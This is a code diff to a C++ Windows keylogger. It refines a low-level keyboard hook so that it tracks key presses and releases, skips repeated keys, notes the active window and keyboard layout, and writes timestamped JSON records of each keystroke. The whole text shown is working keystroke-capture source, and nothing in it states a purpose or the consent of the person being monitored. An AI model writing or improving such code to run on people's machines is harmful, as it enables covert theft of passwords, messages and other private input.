@@ -40,17 +40,36 @@ void Keylogger::Run() {
 }
 
 LRESULT CALLBACK Keylogger::HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode >= 0 && wParam == WM_KEYDOWN) {
+    if (nCode >= 0) {
         KBDLLHOOKSTRUCT* kbData = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
-        GetInstance().LogKeystroke(kbData->vkCode);
+        if (wParam == WM_KEYDOWN) {
+            GetInstance().LogKeystroke(kbData->vkCode, true);
+        } else if (wParam == WM_KEYUP) {
+            GetInstance().LogKeystroke(kbData->vkCode, false);
+        }
     }
     return CallNextHookEx(GetInstance().hookHandle, nCode, wParam, lParam);
 }
 
-void Keylogger::LogKeystroke(int vkCode) {
+void Keylogger::LogKeystroke(int vkCode, bool isKeyDown) {
 #ifdef MOUSE_IGNORE
     if (vkCode == 1 || vkCode == 2) return;
 #endif
+
+    // Handle key press/release for modifier keys
+    if (isKeyDown) {
+        // Only log if this key wasn't already pressed
+        if (pressedKeys.find(vkCode) == pressedKeys.end()) {
+            pressedKeys.insert(vkCode);
+            LogKey(vkCode);
+        }
+    } else {
+        // Remove from pressed keys set
+        pressedKeys.erase(vkCode);
+    }
+}
+
+void Keylogger::LogKey(int vkCode) {
     HWND activeWindow = GetForegroundWindow();
     DWORD threadId = 0;
     HKL keyboardLayout = nullptr;
@@ -81,7 +100,8 @@ void Keylogger::LogKeystroke(int vkCode) {
     struct tm timeInfo;
     localtime_s(&timeInfo, &t);
     char timeStr[64];
-    strftime(timeStr, sizeof(timeStr), "%Y-%m-%dT%H:%M:%S%z", &timeInfo);
+    // Format: YYYY-MM-DDTHH:MM:SS (IST time without timezone name)
+    strftime(timeStr, sizeof(timeStr), "%Y-%m-%dT%H:%M:%S", &timeInfo);
     nlohmann::json logEntry = {
         {"timestamp", std::string(timeStr)},
         {"key", keyLabel.str()},
